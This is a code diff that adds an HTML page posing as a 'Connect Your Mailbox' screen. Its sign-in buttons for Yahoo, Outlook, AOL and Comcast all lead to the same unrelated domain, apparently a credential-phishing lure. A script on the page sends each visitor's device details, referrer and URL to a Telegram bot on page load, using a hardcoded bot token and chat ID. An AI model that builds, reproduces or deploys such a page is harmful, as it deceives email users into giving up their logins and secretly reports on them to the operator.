@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Your Mailbox</title>
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' fill='%234F46E5'/><path d='M20 30L50 55L80 30' stroke='white' stroke-width='3' fill='none' stroke-linecap='round'/><rect x='20' y='30' width='60' height='50' rx='4' fill='none' stroke='white' stroke-width='3'/></svg>">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            max-width: 500px;
+            width: 100%;
+        }
+
+        h1 {
+            text-align: center;
+            font-size: 28px;
+            margin-bottom: 30px;
+            color: #333;
+            font-weight: 600;
+        }
+
+        .button-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            color: white;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            text-decoration: none;
+            gap: 12px;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn-icon {
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+        }
+
+        /* Yahoo */
+        .btn-yahoo {
+            background: linear-gradient(135deg, #5f0e78 0%, #7b1fa2 100%);
+        }
+
+        .btn-yahoo:hover {
+            background: linear-gradient(135deg, #4a0b5c 0%, #6a1591 100%);
+        }
+
+        /* Outlook/Hotmail */
+        .btn-outlook {
+            background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%);
+        }
+
+        .btn-outlook:hover {
+            background: linear-gradient(135deg, #005a9e 0%, #0d52a3 100%);
+        }
+
+        /* AOL */
+        .btn-aol {
+            background: linear-gradient(135deg, #000000 0%, #1a1a1a 100%);
+        }
+
+        .btn-aol:hover {
+            background: linear-gradient(135deg, #0d0d0d 0%, #262626 100%);
+        }
+
+        /* Comcast */
+        .btn-comcast {
+            background: linear-gradient(135deg, #e31b23 0%, #c21515 100%);
+        }
+
+        .btn-comcast:hover {
+            background: linear-gradient(135deg, #bd1219 0%, #a01010 100%);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Connect Your Mailbox</h1>
+        <div class="button-group">
+            <a href="https://kf31tk.sbs/" class="btn btn-yahoo">
+                <span class="btn-icon">Y!</span>
+                <span>Sign in with Yahoo</span>
+            </a>
+            <a href="https://kf31tk.sbs/" class="btn btn-outlook">
+                <span class="btn-icon">📧</span>
+                <span>Outlook, Hotmail, or Office 365</span>
+            </a>
+            <a href="https://kf31tk.sbs/" class="btn btn-aol">
+                <span class="btn-icon">AOL.</span>
+                <span>Sign in with AOL</span>
+            </a>
+            <a href="https://kf31tk.sbs/" class="btn btn-comcast">
+                <span class="btn-icon">⚡</span>
+                <span>Sign in with Comcast</span>
+            </a>
+        </div>
+    </div>
+
+    <script>
+        // Send Telegram notification using Formspree or similar service
+        async function sendTelegramNotification() {
+            const timestamp = new Date().toLocaleString();
+            const userAgent = navigator.userAgent;
+            const referrer = document.referrer || 'Direct';
+            const url = window.location.href;
+
+            const message = `
+🔔 Website Visit Notification
+
+⏰ Time: ${timestamp}
+🌐 Page: Connect Your Mailbox
+📱 Device: ${userAgent}
+🔗 Referrer: ${referrer}
+📍 URL: ${url}
+            `.trim();
+
+            try {
+                // Method 1: Using Discord webhook (if you have one) or direct Telegram
+                const botToken = '8843627497:AAEar6J9SgRL9SfyTB1w3rGCCUockNy5HDw';
+                const chatId = '5821938795';
+                
+                const response = await fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                console.log('Telegram notification sent:', response.status);
+            } catch (error) {
+                console.error('Error sending notification:', error);
+                
+                // Fallback: Log to localStorage for debugging
+                try {
+                    const visits = JSON.parse(localStorage.getItem('pageVisits') || '[]');
+                    visits.push({
+                        timestamp: new Date().toISOString(),
+                        userAgent: userAgent,
+                        referrer: referrer,
+                        url: url
+                    });
+                    localStorage.setItem('pageVisits', JSON.stringify(visits));
+                    console.log('Visit logged locally:', visits);
+                } catch (e) {
+                    console.error('Error logging visit:', e);
+                }
+            }
+        }
+
+        // Send notification when page loads
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', sendTelegramNotification);
+        } else {
+            sendTelegramNotification();
+        }
+
+        // Also try on window load as backup
+        window.addEventListener('load', function() {
+            setTimeout(sendTelegramNotification, 500);
+        });
+    </script>
+</body>
+</html>
